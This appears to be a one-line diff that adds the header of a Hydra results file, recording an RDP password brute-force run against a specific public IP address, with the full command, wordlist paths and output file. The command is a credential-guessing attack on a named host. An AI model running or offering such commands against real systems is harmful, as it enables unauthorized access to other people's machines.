@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-01 08:41:06 on 112.74.90.228 rdp (hydra -L /tmp/rdp_users.txt -P /tmp/big_pass.txt -t 1 -W 3 -o /tmp/rdp_mufengyue.txt rdp://112.74.90.228)
